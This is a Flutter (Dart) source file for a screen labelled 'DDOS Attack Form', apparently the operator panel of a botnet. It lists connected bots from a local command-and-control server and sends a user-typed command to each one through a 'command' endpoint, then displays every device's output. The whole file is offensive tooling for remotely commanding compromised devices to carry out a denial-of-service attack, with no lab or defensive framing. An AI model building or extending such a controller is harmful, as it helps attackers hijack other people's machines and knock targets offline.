import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/src/widgets/framework.dart';
import 'package:flutter/src/widgets/placeholder.dart';
import 'package:http/http.dart' as http;

class DDosAttackScreen extends StatefulWidget {
  static String router = "ddosAttack";
  const DDosAttackScreen({super.key});

  @override
  State<DDosAttackScreen> createState() => _DDosAttackScreenState();
}

class _DDosAttackScreenState extends State<DDosAttackScreen> {
  TextEditingController _commandController = TextEditingController();
  TextEditingController _numBotsController = TextEditingController();
  TextEditingController _outputController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Container(
          margin: EdgeInsets.only(top: 100),
          child: Card(
            elevation: 4,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            child: Padding(
              padding: EdgeInsets.all(16),
              child: Column(children: [
                Text(
                  "DDOS Attack Form",
                  style: Theme.of(context).textTheme.headlineSmall,
                ),
                TextField(
                  controller: _commandController,
                  decoration: InputDecoration(labelText: "Command :"),
                                    style: TextStyle(color: Colors.black),

                ),
                const SizedBox(
                  height: 16,
                ),
                TextField(
                  controller: _numBotsController,
                  keyboardType: TextInputType.number,
                  decoration: InputDecoration(labelText: "Number of Bots:"),
                                    style: TextStyle(color: Colors.black),

                ),
                const SizedBox(
                  height: 16,
                ),
                ElevatedButton(
                  onPressed: () async {
                    _outputController.text = "";
                    String command = _commandController.text;
                    int botsNum = int.tryParse(_numBotsController.text) ?? 0;

                    if (command != "" && botsNum != 0 && botsNum < 11) {
                      final response1 = await http.get(
                          Uri.parse("http://localhost:8080/api/s/clients"));
                      Map connectedBots = json.decode(response1.body);
                      int i = 0;
                      for (var botId in connectedBots.keys) {
                        i += 1;
                        final response2 = await http.get(Uri.parse(
                            "http://localhost:8080/command?command=$command&id=$botId"));
                        // response2.body

                        _outputController.text = _outputController.text +
                                                      """
                                    ~~~~~~~~~~~~~~~~~~~~~~~ Device $i ~~~~~~~~~~~~~~~~~~~~~~~
                                    
                                    ${response2.body} 
                                    
                                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                                    """;
                      }
                    }
                  },
                  child: Text("Send Task"),
                ),
                const SizedBox(
                  height: 16,
                ),
                TextField(
                  controller: _outputController,
                  readOnly: true,
                  maxLines: null,
                  decoration: const InputDecoration(border: OutlineInputBorder()),
                                    style: TextStyle(color: Colors.black),

                )
              ]),
            ),
          )),
    );
  }
}
